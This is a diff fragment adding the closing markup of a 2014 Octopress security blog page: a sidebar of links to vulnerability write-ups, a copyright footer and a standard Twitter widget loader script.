+        <a href="/blog/2014/03/02/introduction/">introduction</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/02/24/ganib-project-management-2.3-sqli/">ganib project management 2.3 SQLi</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/01/26/fetching-jboss-mbean-method-hashes/">Fetching JBoss MBean method hashes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/">Dolibarr 3.4.0 - Multiple Vulnerabilities</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/">OpenEMM-2013 SOAP SQLi/Stored XSS</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
